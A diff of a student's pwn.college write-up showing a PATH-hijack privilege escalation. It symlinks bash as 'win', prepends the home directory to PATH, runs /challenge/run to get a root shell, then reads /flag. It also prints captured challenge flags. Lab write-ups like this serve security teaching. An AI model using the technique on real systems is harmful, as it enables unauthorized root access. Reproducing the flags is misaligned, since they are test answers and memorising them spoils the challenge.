@@ -3,19 +3,19 @@
 ## Procedure
 i started the challenge pwn.college
 as per the question.  
-then i typed `PATH=/challenge/more_commands/` and then i used  `/challenge/run`
+then i typed `ln -s /usr/bin/bash ./win` and then i used  `PATH=/home/hacker/:$PATH` and then i typed `/challenge/run` and then i typed ` cat /flag` 
 then i pasted my flag to the website.
 
 ## Bash
-` Connected!
-hacker@path~setting-path:~$ PATH=/challenge/more_commands/
-hacker@path~setting-path:~$ win
-It looks like 'win' was improperly launched. Don't launch it directly; it MUST
-be launched by /challenge/run!
-hacker@path~setting-path:~$ /challenge/run
+`                                                                             Connected!
+hacker@path~adding-commands:~$ ln -s /usr/bin/bash ./win
+hacker@path~adding-commands:~$ PATH=/home/hacker/:$PATH
+hacker@path~adding-commands:~$ /challenge/run
 Invoking 'win'....
-Congratulations! You properly set the flag and 'win' has launched!
-pwn.college{gp0TXp5cDhSFDSpR6qH_-4p4Lpm.dVzNyUDL3kTN0czW}`
+root@path~adding-commands:~# id
+uid=0(root) gid=1000(hacker) groups=1000(hacker)
+root@path~adding-commands:~# cat /flag
+pwn.college{wCsPJxej8ERnzinFDHpDhNno6yw.dZzNyUDL3kTN0czW}`
 
 ## References
-did not use
+used this yt video https://youtu.be/JcllurbTrNo?si=drf1pH9SZiR_7KT9 
